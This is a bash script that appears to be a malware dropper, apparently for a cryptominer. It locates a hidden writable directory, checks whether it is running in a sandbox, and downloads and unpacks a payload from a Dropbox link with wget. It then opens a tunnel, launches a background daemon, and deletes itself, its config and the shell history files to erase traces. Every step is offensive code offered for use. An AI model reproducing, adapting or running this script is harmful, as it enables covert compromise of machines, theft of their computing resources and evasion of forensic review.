#!/usr/bin/env bash
## needed tmux sed grep envsubst

## load customization variables
[ -f env.sh ] && . ./env.sh && STARTING_VARS=$(<env.sh)
STARTING_PATH=$PATH
STARTING_PID=$BASHPID

pathx() {
    cd ${1}
    touch test.sh &&
    chmod +x test.sh &&
    ./test.sh && rm -f test.sh ||
            { rm -f test.sh && return 1; }
}

tmppath() {
    if tmppath=$($bb mktemp -d -t .XXXXXXXX) && pathx $tmppath; then
        export PATH=${tmppath}:${PATH} tmppath
    else
        for ph in {/dev/shm,/run,/var/tmp,/var/cache,~/.local,~/.cache,~/}; do
            rm -rf $ph/.path &&
                mkdir -p $ph/.path &&
                tmppath=$ph/.path &&
                pathx $tmppath &&
                export PATH=${ph}/.path:${PATH} tmppath &&
                break
        done
    fi
}
tmppath
[ -n "$tmppath" ] && cd $tmppath

jailjudge() {
    ## where are we
    c=$(builtin compgen -G '/etc/cpa*')
    d=$(builtin compgen -G '/dev/*')
    s=$(builtin compgen -G '/sys/*')
    p=$(builtin compgen -G '/proc/*')
    jail=
    if [ -n "$c" -o -z "$d" -o -z "$s" -o -z "$p" ]; then ## we are in a jail
        jail=1
    fi
}
jailjudge

getpayload(){
    ## get payload from dbx
    mask=${pl_mask:-:ep/:token/:name}
    ep=${pl_ep:-https://dl.dropboxusercontent.com/s}
    token=${pl_token:-xxxxxxxxxxxxxxx}
    name=${pl_name:-payload-latest.zip}
    uri=$(eval "echo ${mask//:/$}")
    wget -q $uri
    unzip -q $name && rm $name || return 1
    # tar xf ${BRANCH}.tar.gz && rm ${BRANCH}.tar.gz
    # cd scripts-${BRANCH} || exit 1
}
getpayload || exit 1

. ./functions || exit 1

## utility vars
# CFG_BASE_URL=

## env vars and busybox
export PATH=.:pl:$PATH
bb=.bb
cp $(get_path busybox) "$tmppath/../$bb" && chmod +x "$tmppath/../$bb"

## choose masks
. ./masks || exit 1

## start tunnel
. ./tstarter || exit 1
setup_tnl

## config object
. ./objconfig || exit 1

## start the pausd daemon passing the object args
. ./pausd || exit 1
. ./switch || exit 1
start &
fleep 2 ## give time to fail

## check for alternate if fail
# slept=0
# while [ "$(jobs -r | wc -l)" -lt 2 ]; do
#     slept=$((slept+1))
#     if [ $slept -gt 5 ]; then ## no aes means crash means aeon
#         ## altconfig
#         . ./altconfig
#         ## init
#         start &
#         break
#     fi
#     fleep 1
# done
# fleep 1 ## once more for edge cases

cd ..
## debug
[ "$DEBUG" ] && env>dump.env && exit

## removing tmppath too early might be a race cond
cleanup() {
    rm -rf "$tmppath" "scripts-${BRANCH}" \
       -- "$0" \
       "dig" "cookie" "env.sh" "../env.sh" \
       "$HOME"/.*_history ~/.*_history /.*_history
    # [ -n "$tmppath" ] && find ${tmppath}/${dir} \
    #                           ! -name "$OBJ_MASK" \
    #                           ! -name "$OBJ_CFG_MASK" \
    #                           -delete
}
fleep 10
cleanup

wait %+
